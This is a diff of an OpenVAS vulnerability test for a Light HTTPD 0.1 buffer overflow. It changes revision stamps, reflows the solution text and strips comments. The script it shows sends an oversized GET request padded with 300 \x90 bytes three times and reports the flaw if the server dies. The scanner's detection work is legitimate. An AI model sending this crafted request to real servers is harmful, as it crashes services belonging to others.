@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: secpod_light_httpd_bof_vuln.nasl 6698 2017-07-12 12:00:17Z cfischer $
+# $Id: secpod_light_httpd_bof_vuln.nasl 11096 2018-08-23 12:49:10Z mmartin $
 #
 # Light HTTPD Buffer Overflow Vulnerability
 #
@@ -27,10 +27,10 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.903207");
-  script_version("$Revision: 6698 $");
+  script_version("$Revision: 11096 $");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2017-07-12 14:00:17 +0200 (Wed, 12 Jul 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-08-23 14:49:10 +0200 (Thu, 23 Aug 2018) $");
   script_tag(name:"creation_date", value:"2013-04-26 14:47:16 +0530 (Fri, 26 Apr 2013)");
   script_name("Light HTTPD Buffer Overflow Vulnerability");
 
@@ -52,10 +52,7 @@ if(description)
   Impact Level: System/Application");
   script_tag(name:"affected", value:"Light HTTPD 0.1");
   script_tag(name:"insight", value:"The flaw exists due to improper handling of user-supplied input.");
-  script_tag(name:"solution", value:"No solution or patch was made available for at least one year
-  since disclosure of this vulnerability. Likely none will be provided anymore.
-  General solution options are to upgrade to a newer release, disable respective
-  features, remove the product or replace the product by another one.");
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
   script_tag(name:"summary", value:"The host is running Light HTTPD and is prone to buffer overflow
   vulnerability.");
 
@@ -66,17 +63,8 @@ if(description)
 
 include("http_func.inc");
 
-## Variable Initialization
-banner = "";
-crash = "";
-port = 0;
-req = "";
-res = "";
-
-## Get HTTP Port
 port = get_http_port(default:3000);
 
-## Confirm the application before trying exploit
 banner = get_http_banner(port: port);
 if("Light HTTPd" >!< banner){
   exit(0);
@@ -86,7 +74,6 @@ if(http_is_dead(port:port))exit(0);
 
 host = http_host_name(port:port);
 
-## Construct crafted request
 crash = crap(data: "\x90", length: 300);
 req = string("GET /", crash, " HTTP/1.0\r\n",
              "Host: ", host, "\r\n\r\n");
@@ -96,7 +83,6 @@ for(i=0 ;i < 3; i++){
 res = http_send_recv(port:port, data:req);
 }
 
-## Confirm Light HTTPD is dead
 if(http_is_dead(port:port))
 {
   security_message(port:port);
